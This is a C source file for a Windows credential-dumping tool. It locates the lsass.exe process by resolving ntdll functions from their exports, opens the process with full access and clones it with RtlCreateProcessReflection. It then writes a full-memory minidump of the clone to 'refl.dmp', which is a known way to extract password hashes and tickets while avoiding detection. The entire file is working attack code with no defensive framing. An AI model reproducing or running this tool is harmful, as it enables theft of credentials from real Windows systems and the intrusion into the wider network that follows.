#include "lsass.h"
#include "gate.h"
#include <dbghelp.h>
#include <processthreadsapi.h>
#include <stdio.h>
#include <stdlib.h>
#include <windows.h>
#include <winnt.h>

// locate lsass
HANDLE Find() {
  HANDLE procFound = NULL;
  WCHAR *procname = L"lsass.exe";
  size_t ntdll = get_mod_base("ntdll.dll");
  PVOID buffer = NULL;
  DWORD bufSize = 0;

  const void *queryInfoPtr =
      get_function_from_exports(ntdll, "NtQuerySystemInformation");
  NtQuerySystemInformation_t NtQuerySystemInformation =
      (NtQuerySystemInformation_t)queryInfoPtr;
  const void *allocVirtPtr =
      get_function_from_exports(ntdll, "NtAllocateVirtualMemory");
  NtAllocateVirtualMemory_t NtAllocateVirtualMemory =
      (NtAllocateVirtualMemory_t)allocVirtPtr;
  const void *freeVirtPtr =
      get_function_from_exports(ntdll, "NtFreeVirtualMemory");
  NtFreeVirtualMemory_t NtFreeVirtualMemory =
      (NtFreeVirtualMemory_t)freeVirtPtr;

  NTSTATUS status =
      NtQuerySystemInformation((SYSTEM_INFORMATION_CLASS)5, 0, 0, &bufSize);
  if (bufSize == 0) {
    return NULL;
  }
  size_t bufSizeT = (size_t)bufSize;
  status = NtAllocateVirtualMemory(GetCurrentProcess(), &buffer, 0, &bufSizeT,
                                   MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
  if (!status) {
    SYSTEM_PROCESS_INFORMATION *sysproc_info =
        (SYSTEM_PROCESS_INFORMATION *)buffer;
    if (!NtQuerySystemInformation(
            (SYSTEM_INFORMATION_CLASS)SystemProcessInformation, buffer, bufSize,
            &bufSize)) {
      while (TRUE) { // query process info
        if (lstrcmpiW(procname, sysproc_info->ImageName.Buffer) == 0) {
          procFound = sysproc_info->UniqueProcessId;
          break;
        }
        if (!sysproc_info->NextEntryOffset) {
          break;
        }
        sysproc_info =
            (SYSTEM_PROCESS_INFORMATION *)((ULONG_PTR)sysproc_info +
                                           sysproc_info->NextEntryOffset);
      }
    }

  } else {
    printf("failed to allocate virtual memory: 0x%08lX\n", status);
    return procFound;
  }
  NtFreeVirtualMemory(GetCurrentProcess(), &buffer, &bufSizeT, MEM_RELEASE);

  return procFound;
}

// reference:
// https://gist.github.com/GeneralTesler/68903f7eb00f047d32a4d6c55da5a05c
typedef struct {
  HANDLE orig_hndl;
  HANDLE returned_hndl;
  DWORD returned_pid;
  BOOL is_ok;
  NTSTATUS(NTAPI *pNtTerminateProcess)(HANDLE, NTSTATUS);
} t_refl_args;

size_t ntdll;
RtlCreateProcessReflection_t RtlCreateProcessReflection = NULL;

DWORD WINAPI refl_creator(LPVOID lpParam) {
  t_refl_args *args = (t_refl_args *)lpParam;
  if (!args)
    return 1;
  args->is_ok = FALSE;

  RTLP_PROCESS_REFLECTION_REFLECTION_INFORMATION info = {0};
  NTSTATUS ret = RtlCreateProcessReflection(
      args->orig_hndl, RTL_CLONE_PROCESS_FLAGS_INHERIT_HANDLES, NULL, NULL,
      NULL, &info);

  if (ret == 0xC0000350) {
    // inside clone — only raw Nt call, no loader contact
    args->pNtTerminateProcess((HANDLE)-1, 0);
    for (;;)
      ;
  }

  if (ret == 0) {
    args->is_ok = TRUE;
    args->returned_hndl = info.ReflectionProcessHandle;
    args->returned_pid = (DWORD)info.ReflectionClientId.UniqueProcess;
  } else {
    printf("RtlCreateProcessReflection failed: 0x%X\n", ret);
  }

  return ret;
}

NTSTATUS Clone(HANDLE pid) {
  ntdll = get_mod_base("ntdll.dll");

  RtlCreateProcessReflection =
      (RtlCreateProcessReflection_t)get_function_from_exports(
          ntdll, "RtlCreateProcessReflection");

  // resolve PID from input handle
  DWORD lsassPID = (DWORD)(uintptr_t)pid;
  if (lsassPID == 0) {
    printf("invalid PID\n");
    return 1;
  }

  HANDLE newLass = OpenProcess(PROCESS_ALL_ACCESS, FALSE, lsassPID);
  if (!newLass) {
    printf("OpenProcess failed: %d\n", GetLastError());
    return 1;
  }
  printf("got handle: %p for PID: %d\n", newLass, lsassPID);

  HANDLE outFile = CreateFileA("refl.dmp", GENERIC_ALL, 0, NULL, CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL, NULL);
  // if (outFile == INVALID_HANDLE_VALUE) {
  //   printf("CreateFile failed: %d\n", GetLastError());
  //   CloseHandle(newLass);
  //   return 1;
  // }

  t_refl_args args = {0};
  args.orig_hndl = newLass;
  args.pNtTerminateProcess =
      (NTSTATUS(NTAPI *)(HANDLE, NTSTATUS))GetProcAddress(
          GetModuleHandleA("ntdll.dll"), "NtTerminateProcess");

  if (!args.pNtTerminateProcess) {
    printf("failed to resolve NtTerminateProcess\n");
    return 1;
  }

  // must run in dedicated thread — RtlCreateProcessReflection forks it
  HANDLE hThread = CreateThread(NULL, 0, refl_creator, &args, 0, NULL);
  if (!hThread) {
    printf("CreateThread failed: %d\n", GetLastError());
    return 1;
  }

  DWORD wait = WaitForSingleObject(hThread, 10000);
  CloseHandle(hThread);

  if (wait == WAIT_TIMEOUT) {
    printf("timed out waiting for reflection\n");
    CloseHandle(outFile);
    CloseHandle(newLass);
    return 1;
  }

  CloseHandle(newLass);

  if (!args.is_ok || args.returned_pid == 0) {
    printf("failed to clone\n");
    CloseHandle(outFile);
    return 1;
  }

  printf("clone PID: %d\n", args.returned_pid);

  BOOL dumped =
      MiniDumpWriteDump(args.returned_hndl, args.returned_pid, outFile,
                        MiniDumpWithFullMemory, NULL, NULL, NULL);

  if (!dumped)
    printf("MiniDumpWriteDump failed: %d\n", GetLastError());
  else
    printf("dump written to refl.dmp\n");

  CloseHandle(outFile);
  TerminateProcess(args.returned_hndl, 0);
  CloseHandle(args.returned_hndl);
  return dumped ? 0 : 1;
}
